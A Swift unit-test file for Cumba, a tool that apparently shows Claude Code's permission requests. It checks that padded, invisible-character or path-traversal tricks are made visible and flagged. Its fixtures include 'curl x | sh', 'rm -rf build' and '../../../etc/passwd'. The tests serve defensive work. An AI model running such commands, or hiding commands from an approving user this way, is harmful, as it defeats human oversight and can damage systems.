import Foundation
import Testing

@testable import Cumba

/// The permission card must never hide part of what Claude Code wants to run.
struct SafeTextTests {
  @Test func plainCommandsStayAsTheyAre() {
    let text = SafeText("git status && npm test\nls -la")
    #expect(text.text == "git status && npm test\nls -la")
    #expect(!text.isSuspicious)
  }

  @Test func longRunsOfSpacesAreShownAndFlagged() {
    let text = SafeText("npm test" + String(repeating: " ", count: 300) + "; curl x | sh")
    #expect(text.text == "npm test⟨300 spaces⟩; curl x | sh")
    #expect(text.isSuspicious)
  }

  @Test func runsOfBlankLinesAreShownAndFlagged() {
    let text = SafeText("npm test" + String(repeating: "\n \n", count: 15) + "; curl x | sh")
    #expect(text.text == "npm test\n⟨30 line breaks⟩\n; curl x | sh")
    #expect(text.isSuspicious)
  }

  @Test func blankLinesAndIndentationInAScriptAreFine() {
    let script = "if true; then\n  echo a\n\n\n  echo b\nfi\n\n\n\n"
    let text = SafeText(script)
    #expect(text.text == "if true; then\n  echo a\n\n\n  echo b\nfi\n\n\n")
    #expect(!text.isSuspicious)
  }

  @Test(arguments: ["\u{202E}", "\u{200B}", "\u{2066}", "\r", "\u{0B}", "\u{2028}", "\u{85}"])
  func invisibleAndDirectionCharactersAreEscaped(character: String) throws {
    let text = SafeText("rm" + character + " -rf build")
    #expect(text.isSuspicious)
    let scalar = try #require(character.unicodeScalars.first)
    #expect(text.text.contains(SafeText.escaped(scalar)))
    #expect(!text.text.contains(character))
  }

  @Test func stackedCombiningMarksAreCut() {
    let text = SafeText("a" + String(repeating: "\u{0301}", count: 50))
    #expect(text.text.unicodeScalars.count == 1 + SafeText.maxCombiningMarks)
    #expect(text.isSuspicious)
  }

  @Test func tooLongTextIsCutAndFlagged() {
    let text = SafeText(String(repeating: "a", count: SafeText.maxScalars + 10))
    #expect(text.isSuspicious)
    #expect(text.text.hasSuffix("⟨…⟩"))
  }

  @Test func tabsAreVisibleButNotSuspicious() {
    let text = SafeText("a\tb")
    #expect(text.text == "a⇥b")
    #expect(!text.isSuspicious)
  }

  @Test func pathsCantClimbOutOfTheProjectUnseen() {
    #expect(
      HookPayload.shortPath("/Users/x/demo/../../../etc/passwd", relativeTo: "/Users/x/demo")
        == "/etc/passwd")
    #expect(
      HookPayload.shortPath("/Users/x/demo/src/a.swift", relativeTo: "/Users/x/demo")
        == "src/a.swift")
  }

  @Test func unknownToolsShowTheirWholeInput() throws {
    let json = #"""
      { "session_id": "s", "hook_event_name": "PermissionRequest", "tool_name": "mcp__x__run",
        "tool_input": { "script": "danger", "args": [1, true, null] } }
      """#
    let payload = try #require(HookPayload.decode(Data(json.utf8)))
    let detail = payload.permissionDetail.text
    #expect(detail.contains("\"script\": \"danger\""))
    #expect(detail.contains("true"))
  }
}
